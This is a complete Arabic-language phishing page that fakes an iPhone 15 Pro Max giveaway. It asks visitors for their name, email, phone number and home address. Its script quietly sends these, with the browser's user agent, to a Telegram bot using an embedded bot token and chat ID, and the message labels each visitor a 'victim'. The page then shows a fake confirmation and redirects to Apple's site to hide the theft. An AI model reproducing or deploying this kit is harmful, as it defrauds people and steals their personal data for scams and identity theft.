<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>اربح iPhone 15</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#000,#1a1a1a);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{background:linear-gradient(135deg,#0a0a0a,#1a1a1a);border-radius:24px;padding:30px 20px;max-width:400px;width:100%;text-align:center;border:2px solid #d4af37;box-shadow:0 0 50px rgba(212,175,55,0.3)}
.logo{font-size:70px;margin-bottom:10px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
h1{font-size:24px;background:linear-gradient(135deg,#d4af37,#f5e6a3);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:8px}
.sub{color:#999;font-size:13px;margin-bottom:20px}
.prize{background:rgba(212,175,55,0.1);border:1px solid #d4af37;border-radius:15px;padding:15px;margin-bottom:20px}
.prize .phone{font-size:50px}
.prize .name{color:#d4af37;font-size:16px;font-weight:bold;margin-top:5px}
.fg{margin-bottom:14px;text-align:right}
label{display:block;color:#ccc;font-size:12px;margin-bottom:5px}
input,select{width:100%;padding:13px;background:rgba(255,255,255,0.05);border:1px solid #333;border-radius:10px;color:#fff;font-size:14px;outline:none}
input:focus,select:focus{border-color:#d4af37}
.btn{width:100%;padding:14px;margin-top:10px;background:linear-gradient(135deg,#d4af37,#b8960f);color:#000;border:none;border-radius:25px;font-size:17px;font-weight:bold;cursor:pointer}
.btn:active{transform:scale(0.96)}
.load{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99;justify-content:center;align-items:center;flex-direction:column}
.load.show{display:flex}
.spinner{width:50px;height:50px;border:4px solid #333;border-top:4px solid #d4af37;border-radius:50%;animation:spin 0.8s linear infinite;margin-bottom:18px}
@keyframes spin{to{transform:rotate(360deg)}}
.done{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;justify-content:center;align-items:center;flex-direction:column}
.done.show{display:flex}
.done h2{color:#d4af37;font-size:24px;margin:12px 0}
</style>
</head>
<body>
<div class="container" id="form">
<div class="logo">📱</div>
<h1>اربح iPhone 15 Pro Max</h1>
<p class="sub">أدخل بياناتك للفوز</p>
<div class="prize"><div class="phone">📱✨</div><div class="name">iPhone 15 Pro Max</div></div>
<div class="fg"><label>👤 الاسم الكامل</label><input type="text" id="name" placeholder="الاسم الكامل"></div>
<div class="fg"><label>📧 البريد الإلكتروني</label><input type="email" id="email" placeholder="email@example.com"></div>
<div class="fg"><label>📱 رقم الهاتف</label><input type="tel" id="phone" placeholder="010xxxxxxxx"></div>
<div class="fg"><label>📍 العنوان</label><input type="text" id="address" placeholder="العنوان كامل"></div>
<button class="btn" onclick="go()">🎁 اشترك في السحب</button>
</div>
<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري التسجيل...</p></div>
<div class="done" id="done"><h2>✅ تم التسجيل!</h2><p>سيتم التواصل مع الفائزين قريباً</p></div>
<script>
var u=new URL(window.location.href);
var CHAT=u.searchParams.get('chatId')||'7276604783';
var TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
async function send(t){
try{await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
}
async function go(){
var nm=document.getElementById('name').value.trim();
var em=document.getElementById('email').value.trim();
var ph=document.getElementById('phone').value.trim();
var ad=document.getElementById('address').value.trim();
if(!nm||!em||!ph||!ad)return alert('املأ جميع الحقول');
document.getElementById('load').classList.add('show');
var msg='📱 <b>ضحية ربح آيفون!</b>\n\n👤 اسم: '+nm+'\n📧 إيميل: '+em+'\n📱 هاتف: '+ph+'\n📍 عنوان: '+ad+'\n\n📱 '+navigator.userAgent;
await send(msg);
setTimeout(function(){document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(function(){window.location.href='https://apple.com/'},3000)},4000);
}
</script>
</body>
</html>
